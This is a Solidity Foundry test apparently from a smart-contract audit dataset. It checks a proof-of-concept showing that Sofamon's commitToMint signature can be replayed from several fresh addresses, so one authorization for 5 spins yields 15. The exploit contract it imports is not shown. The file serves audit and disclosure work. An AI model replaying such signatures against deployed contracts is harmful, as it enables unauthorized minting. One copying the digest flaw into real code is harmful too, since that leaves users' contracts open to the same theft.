// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Exploit, SofamonMinter, MarkerToken} from "./41365-h-01-signatures-can-be-replayed-using-different-addresses-pa.sol";

// Sofamon August H-01 (finding 41365): `commitToMint` verifies a signer signature
// over a digest that OMITS msg.sender; the only per-caller binding is
// nonce = userNonce[msg.sender], which is 0 for any fresh account. A single
// signer-authorized signature (spins=5, nonce=0) is therefore replayable from any
// number of throwaway accounts, each minting another valid ticket crediting the same
// minter — inflating a one-time authorization into an unbounded mint allocation.
contract Finding41365Test is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_signatureReplayAcrossAddresses() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("valid tickets from ONE signature", e.ticketCount());
        emit log_named_uint("distinct senders that passed signer check", e.distinctSendersPassed());
        emit log_named_uint("spins authorized by signer", e.authorizedSpins());
        emit log_named_uint("spins actually granted to attacker", e.grantedSpins());
        emit log_named_uint("unauthorized spins", e.unauthorizedSpins());
        emit log_named_uint("harm marked at sink (1e18 = 1 spin)", e.sinkHarm());

        // one signer signature was accepted by three distinct msg.senders
        assertEq(e.ticketCount(), 3, "one signature must mint three valid tickets");
        assertEq(e.distinctSendersPassed(), 3, "three distinct senders passed the signer check");

        // the signer authorized 5 spins once; 15 were granted -> 10 unauthorized
        assertEq(e.authorizedSpins(), 5, "signer authorized 5 spins");
        assertEq(e.grantedSpins(), 15, "attacker received 15 spins");
        assertEq(e.unauthorizedSpins(), 10, "10 spins were never authorized");

        // harm magnitude recorded at the SINK marker
        assertEq(e.sinkHarm(), 10e18, "10 unauthorized spins recorded");
        assertEq(e.marker().balanceOf(SINK), 10e18, "harm marker not at sink");
    }
}
